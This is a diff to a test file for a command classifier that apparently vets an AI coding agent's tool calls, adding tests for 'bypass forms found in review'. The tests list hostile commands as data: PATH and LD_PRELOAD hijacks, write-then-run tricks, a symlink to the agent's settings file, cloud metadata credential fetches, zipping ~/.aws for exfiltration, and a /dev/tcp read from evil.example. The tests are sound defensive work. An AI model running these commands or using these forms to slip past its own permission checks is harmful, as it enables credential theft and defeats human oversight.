@@ -23,6 +23,7 @@ function workspace() {
   }));
   fs.writeFileSync(path.join(proj, 'util.sh'), 'npm publish\nwrangler deploy\nrm -rf /srv\n');
   fs.writeFileSync(path.join(proj, 'safe.sh'), '#!/bin/sh\nset -e\nnpm test\ngit status\n');
+  fs.writeFileSync(path.join(proj, 'requirements.txt'), '# deps\nrequests==2.32.3\nnumpy>=1.26,<3\nuvicorn[standard]~=0.30\n');
   return { root, home, proj, classifier: createClassifier(BASELINE_POLICY, { home }) };
 }
 
@@ -208,4 +209,70 @@ test('command substitution: routine bodies stay routine, dangerous uses do not',
   assert.equal(cls('cat $(echo ~/.aws/credentials)'), 'unknown');
   assert.equal(cls('$(printf rm) -rf /x'), 'unknown');
   assert.equal(cls('git push origin $(git branch --show-current)'), 'unknown');
+});
+
+test('bypass forms found in review are not routine', () => {
+  const ws = workspace();
+  const cls = (command) => ws.classifier.classify({ tool_name: 'Bash', tool_input: { command }, cwd: ws.proj }).class;
+  try {
+    // PATH hijack and other environment that changes what later programs run.
+    assert.notEqual(cls('export PATH=.:$PATH; ls'), 'routine');
+    assert.notEqual(cls('env PATH=. ls'), 'routine');
+    assert.notEqual(cls('npm_config_script_shell=./x.sh npm test'), 'routine');
+    assert.notEqual(cls('declare -x LD_PRELOAD=./x.so; ls'), 'routine');
+    // Write-then-run inside one command line: the script is not judged by its old contents.
+    assert.notEqual(cls("echo 'npm publish' > safe.sh && bash safe.sh"), 'routine');
+    assert.notEqual(cls('cp util.sh safe.sh; ./safe.sh'), 'routine');
+    assert.notEqual(cls(`echo '{"scripts":{"test":"npm publish"}}' > package.json && npm test`), 'routine');
+    // npm install runs the root package's lifecycle scripts.
+    fs.writeFileSync(path.join(ws.proj, 'package.json'), JSON.stringify({ scripts: { postinstall: 'npm publish', test: 'node --test' } }));
+    assert.equal(cls('npm install'), 'risky');
+    assert.equal(cls('npm ci'), 'risky');
+    fs.writeFileSync(path.join(ws.proj, 'package.json'), JSON.stringify({ scripts: { prepare: 'tsc -p .', test: 'node --test' } }));
+    assert.equal(cls('npm install'), 'routine');
+    // A workspace file that is a symlink to a protected file is judged by its target.
+    fs.mkdirSync(path.join(ws.home, '.claude'), { recursive: true });
+    fs.writeFileSync(path.join(ws.home, '.claude', 'settings.json'), '{}');
+    fs.symlinkSync(path.join(ws.home, '.claude', 'settings.json'), path.join(ws.proj, 'notes.json'));
+    assert.equal(ws.classifier.classify({ tool_name: 'Write', tool_input: { file_path: path.join(ws.proj, 'notes.json'), content: '{}' }, cwd: ws.proj }).class, 'risky');
+    assert.equal(cls('echo {} > notes.json'), 'risky');
+    // Cloud metadata and other internal hosts.
+    assert.notEqual(cls('curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/'), 'routine');
+    assert.notEqual(ws.classifier.classify({ tool_name: 'WebFetch', tool_input: { url: 'http://metadata.google.internal/computeMetadata/v1/', prompt: 'x' }, cwd: ws.proj }).class, 'routine');
+    // Staging secrets for exfiltration, sed's execute flag, local pip installs, git hooks.
+    assert.equal(cls('zip -r /tmp/x.zip ~/.aws'), 'risky');
+    assert.notEqual(cls("sed 's/x/touch pwned/e' notes.txt"), 'routine');
+    assert.notEqual(cls('pip install -e .'), 'routine');
+    assert.notEqual(cls('pip install ./local-pkg'), 'routine');
+    assert.equal(cls('pip install requests==2.32.3'), 'routine');
+    assert.notEqual(ws.classifier.classify({ tool_name: 'Write', tool_input: { file_path: path.join(ws.proj, '.husky', 'pre-commit'), content: 'npm publish' }, cwd: ws.proj }).class, 'routine');
+    assert.notEqual(cls('echo x >> ~/.config/environment.d/10-x.conf'), 'routine');
+  } finally { fs.rmSync(ws.root, { recursive: true, force: true }); }
+});
+
+test('the classifier marks actions it could not fully capture as truncated', () => {
+  const ws = workspace();
+  try {
+    const nine = 'ls; pwd; date; id; uname; whoami; hostname; uptime; mytool one';
+    const many = Array.from({ length: 40 }, (_, i) => `ls d${i}`).join('; ') + '; mytool x';
+    const result = ws.classifier.classify({ tool_name: 'Bash', tool_input: { command: many }, cwd: ws.proj });
+    assert.equal(result.truncated, true);
+    assert.equal(ws.classifier.classify({ tool_name: 'Bash', tool_input: { command: nine }, cwd: ws.proj }).truncated, false);
+    assert.ok(ws.classifier.classify({ tool_name: 'Bash', tool_input: { command: nine }, cwd: ws.proj }).commands.some((c) => c.startsWith('mytool')), 'the 9th command reaches the server');
+  } finally { fs.rmSync(ws.root, { recursive: true, force: true }); }
+});
+
+test('second-pass bypass forms: PATH directories, /dev/tcp, broad recursive chmod, .git deletion, recursive credential reads', () => {
+  const classifier = createClassifier(BASELINE_POLICY, { home: '/home/probeuser' });
+  const cls = (command, cwd = '/srv/work/proj') => classifier.classify({ tool_name: 'Bash', tool_input: { command }, cwd }).class;
+  assert.notEqual(cls('install -m 755 evil ~/.local/bin/ls'), 'routine');
+  assert.notEqual(cls('cat < /dev/tcp/evil.example/80'), 'routine');
+  assert.equal(cls('chmod -R 777 ~'), 'risky');
+  assert.equal(cls('chmod +x scripts/run.sh'), 'routine');
+  assert.equal(cls('rm -rf .git'), 'risky');
+  assert.equal(cls('rm -rf dist'), 'routine');
+  assert.notEqual(cls('grep -r token ~/.config/gh'), 'routine');
+  assert.notEqual(cls('grep -r token ~'), 'routine');
+  assert.equal(cls('grep -rn TODO src'), 'routine');
+  assert.notEqual(cls('rm -rf ${HOME}/x'), 'routine');
 });
